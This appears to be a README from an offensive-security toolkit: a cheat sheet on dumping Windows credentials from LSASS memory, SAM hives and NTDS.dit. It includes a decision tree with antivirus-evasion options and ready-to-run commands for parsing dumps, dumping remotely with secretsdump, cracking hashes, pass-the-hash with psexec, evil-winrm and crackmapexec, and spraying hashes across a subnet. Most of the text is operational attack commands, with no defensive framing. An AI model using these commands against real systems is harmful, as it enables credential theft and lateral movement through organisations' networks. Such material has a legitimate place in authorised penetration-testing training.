# Credential Dumping — LSASS / SAM / NTDS

Credential dumping extracts password hashes, plaintext passwords, and Kerberos tickets from Windows systems. Everything else in post-exploitation flows from these credentials.

---

## Files

| File | What it does |
|------|-------------|
| `lsass-dump.ps1` | Dump LSASS process memory (plaintext + hashes) |
| `sam-extract.ps1` | Extract SAM/SYSTEM/NTDS hive files (NTLM hashes) |

---

## Quick decision: which technique?

```
I need credentials...
│
├── Local user hashes only → SAM/SYSTEM extraction
│   └── reg save (live) or VSS copy (safer)
│
├── Plaintext passwords or Kerberos tickets → LSASS dump
│   ├── No binary drop → comsvcs.dll MiniDump (LOLBin)
│   ├── Can drop binary → ProcDump (Sysinternals, AV-safe)
│   └── Want no disk artifacts → Invoke-SharpLoader + mimikatz.enc
│
├── Domain accounts (DC) → NTDS.dit
│   └── VSS copy of NTDS.dit + SYSTEM hive
│
└── Remote (have creds/hash already) → secretsdump remotely
    └── impacket-secretsdump -hashes :HASH admin@TARGET
```

---

## Parse results on Kali

```bash
# Parse LSASS dump
pypykatz lsa minidump lsass.dmp          # Python, no Windows
# Or transfer to Windows:
# mimikatz: sekurlsa::minidump lsass.dmp → sekurlsa::logonpasswords

# Parse SAM
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL

# Parse NTDS (domain controller)
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL -just-dc-ntlm

# Remote dump (no files)
impacket-secretsdump administrator:Password1@TARGET
impacket-secretsdump -hashes :NTLMHASH 'DOMAIN\Administrator'@TARGET
```

---

## Credential types explained

| Type | Where found | Format | Use |
|------|------------|--------|-----|
| NTLM hash | SAM, NTDS, LSASS | 32-char hex | Pass-the-hash, crack |
| Net-NTLMv2 | NTLM relay | Challenge/response | Crack only (no PTH) |
| Cleartext | LSASS (WDigest) | plaintext | Direct use |
| Kerberos TGT | LSASS | .kirbi file | Pass-the-ticket |
| Kerberos TGS | LSASS | .kirbi or crackable | Kerberoast |
| LSA secrets | SECURITY hive | various | Service accounts |

---

## After you have hashes

```bash
# Crack NTLM with hashcat
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Pass-the-hash (no cracking needed)
impacket-psexec -hashes :HASH Administrator@TARGET
evil-winrm -i TARGET -u Administrator -H HASH
crackmapexec smb TARGET -u Administrator -H HASH

# Spray hashes across subnet
crackmapexec smb 172.16.1.0/24 -u Administrator -H HASH --local-auth
```
